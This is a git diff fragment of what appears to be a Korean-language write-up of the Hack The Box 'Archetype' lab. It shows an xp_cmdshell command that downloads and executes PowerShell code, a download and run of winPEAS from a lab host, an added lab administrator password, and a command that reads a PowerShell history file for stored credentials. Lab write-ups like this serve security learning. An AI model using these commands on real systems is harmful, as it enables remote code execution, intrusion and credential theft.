@@ -55,7 +55,11 @@ EXEC xp_cmdshell 'powershell -c "IEX (New-Object System.Net.Webclient).DownloadS
 iwr -uri http://10.10.14.11:8000/winPEASx64.exe -OutFile winPEAS.exe
 .\winPEAS.exe
 
-
+# history 열람 administrator : MEGACORP_4dm1n!!
+type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
 ```
 
-![](assets/images/posts/2025-03-06-Archetype/6c6a769b01b337f5043407c95d2f9261_MD5.jpeg)![](Pasted%20image%2020250306215106.png)
+![](assets/images/posts/2025-03-06-Archetype/6c6a769b01b337f5043407c95d2f9261_MD5.jpeg)![](assets/images/posts/2025-03-06-Archetype/779e533c4fb09c41b3407c229dd160a4_MD5.jpeg)
+![](assets/images/posts/2025-03-06-Archetype/9781a5273a3edd4de922675970ed39f5_MD5.jpeg)
+
+### 
